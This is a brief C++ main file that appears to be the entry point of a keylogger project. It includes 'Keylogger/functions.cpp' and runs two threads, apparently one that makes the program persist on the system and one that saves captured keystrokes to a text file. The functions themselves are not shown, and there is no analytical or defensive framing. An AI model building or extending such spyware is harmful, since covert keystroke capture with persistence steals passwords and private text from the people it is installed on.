#include "Keylogger/functions.cpp"
#include "Utils/keyboard.h"

int main()
{
	std::thread t1;
	std::thread t2;
	t1 = std::thread(PersistantApplication);
	t2 = std::thread(saveInTextFile);
	t1.join();
	t2.join();
	return 0;
}
